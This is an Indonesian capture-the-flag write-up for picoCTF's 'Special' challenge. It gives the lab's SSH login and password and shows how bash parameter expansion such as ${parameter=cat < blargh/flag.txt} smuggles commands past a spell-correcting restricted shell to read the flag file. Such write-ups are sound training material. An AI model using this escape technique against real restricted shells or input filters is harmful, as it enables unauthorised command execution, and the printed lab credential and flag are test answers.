# DESKIPSI

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
Start your instance to see connection details.
ssh -p 65416 ctf-player@saturn.picoctf.net
The password is d137d16e

# SOLUSI 

Pertama login ke ssh yang sudah tertera ```ssh -p 65416 ctf-player@saturn.picoctf.net``` dengan pw ```d137d16e```

Setelah masuk kedalam ssh kita akan memasuki mode special yang dimama agak terdapat perbedaan dalam menggunakan command maupun fungsinya
Kita di suruh eksperimen untuk menggunakan syntax dari shell 

Kita coba dengan perintah seperti ```${parameter='command'}```

Dalam dasarannya selalu menggunakan ```$``` untuk parameter, contoh parameter seperti :
```
Parameters
Function
$1-$9
Represent positional parameters for arguments one to nine
${10}-${n}
Represent positional parameters for arguments after nine
$0
Represent name of the script
$∗
Represent all the arguments as a single string
$@
Same as $∗, but differ when enclosed in (")
```
DLL

dan disini kita menggunakan ```${parameter}``` sebagai pengganti , namun pada parameter tersebut jika memiliki nilai akan menjalankan sesuai dengan command sebelumnya

Namun disini kita belum mempunyai nilai untuk parameternya dan kita akan memberi nilai(command) pada parameter dengan menambahkan ```=``` setelah parameter yang menandakan bahwa parameter tersebut berjalan sesuai dengan command itu sendiri

CONTOH :

```${parameter=ls}``` untuk membaca pada dir tersebut menggunakan commannd ls yang di sangkutkan dengan parameter agar parameter berjalan dengan command tsb

Langsung saja pada penyelesaiannya:
```
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cat blargh}
${parameter=cat blargh} 
cat: blargh: Is a directory
Special$ ${parameter=cd blargh}
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt} 
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_...}Special$
```
DONE
